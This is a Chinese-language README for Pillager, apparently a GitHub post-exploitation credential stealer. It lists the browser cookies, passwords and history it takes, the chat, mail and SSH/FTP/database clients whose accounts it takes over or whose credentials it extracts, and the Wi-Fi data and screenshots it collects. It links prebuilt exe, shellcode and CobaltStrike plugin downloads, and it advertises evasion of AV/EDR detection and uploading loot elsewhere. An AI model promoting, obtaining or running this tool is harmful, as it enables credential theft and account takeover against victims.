## Pillager <https://github.com/qwqdanchun/Pillager>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-C#-blue)
![Author](https://img.shields.io/badge/Author-qwqdanchun-orange)
![GitHub stars](https://img.shields.io/github/stars/qwqdanchun/Pillager.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V0.0.1-red)
![Time](https://img.shields.io/badge/Join-20231106-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

Pillager是一个适用于后渗透期间的信息收集工具，可以收集目标机器上敏感信息，方便下一步渗透工作的进行。

## 支持

#### 浏览器

| 名称          | 书签 | Cookies | 密码 | 历史记录 | Local Storage | Extension Settings |
| :------------ | :--: | :-----: | :--: | :------: | :-----------: | :----------------: |
| IE            |  ✅  |   ❌   |  ✅  |    ✅    |      ❌      |         ❌         |
| Edge          |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome        |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome Beta   |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chrome SxS    |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Chromium      |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| Brave-Browser |  ✅  |   ✅   |  ✅  |    ✅    |      🚧      |         🚧         |
| QQBrowser     |  ✅  |   ✅   |  ✅  |    ✅    |      ✅      |         ✅         |
| SogouExplorer |  ✅  |   ✅   |  ✅  |    ✅    |      🚧      |         🚧         |
| 360Chrome     |  ❌  |   ✅   |  ✅  |    ❌    |      ✅      |         ✅         |
| 360ChromeX    |  ❌  |   ✅   |  ✅  |    ❌    |      ✅      |         ✅         |
| Vivaldi       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| CocCoc        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Torch         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Kometa        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Orbitum       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| CentBrowser   |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| 7Star         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Sputnik       |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Epic Privacy  |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Uran          |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Yandex        |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Opera         |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| Opera GX      |  🚧  |   🚧   |  🚧  |    🚧    |      🚧      |         🚧         |
| FireFox       |  ✅  |   ✅   |  ✅  |    ✅    |      ❌      |         ✅         |

注：✅表示经过测试，🚧表示理论上支持但未经测试，❌表示无此功能或不支持

#### 软件

* 账户接管
  * Telegram
  * Skype
  * Enigma
  * 钉钉
  * Line
  * Discord
  * 网易邮箱大师
  * Foxmail
  * FileZilla
* 凭据提取
  * MobaXterm
  * Xmanager
  * RDCMan
  * FinalShell
  * Navicat
  * SQLyog
  * SecureCRT
  * Outlook
  * MailBird
  * WinSCP
  * DBeaver
  * CoreFTP
  * Snowflake
* 个人信息
  * QQ
  * VSCode
  * 网易云音乐

后续将会陆续添加支持的软件

#### System

* Wifi
* 截屏
* 已安装应用

## 使用方法

此项目使用Github Action自动编译打包，并上传至[Release](https://github.com/qwqdanchun/Pillager/releases)，其中

* [Pillager.exe](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.exe) 为.Net Framework v3.5编译生成的exe
* [Pillager.bin](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/Pillager.bin) Donut打包的raw格式的shellcode
* [cs-plugin.zip](https://github.com/qwqdanchun/Pillager/releases/download/AutoBuild/cs-plugin.zip) 为适用于CobaltStrike使用的插件

使用CobaltStrike可以直接下载插件包，其他人推荐将shellcode集成至自己的加载器或工具中运行，不建议直接使用Pillager.exe

执行后会将文件打包至 `%Temp%\Pillager.zip`，需要自行前往目录下载文件或修改代码将文件上传至他处

## 优点

* 体积在100kb左右，为同类工具体积的几分之一甚至几十分之一
* 支持大部分常见浏览器，常见聊天软件的信息提取，将陆续添加其他常用工具的信息收集
* 长期维护，有问题可以及时的反馈处理
* 使用魔改版本的Donut，缩小shellcode体积，使shellcode兼容.Net Framework v3.5/v4.x，并去除AV/EDR对Donut提取的特征

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
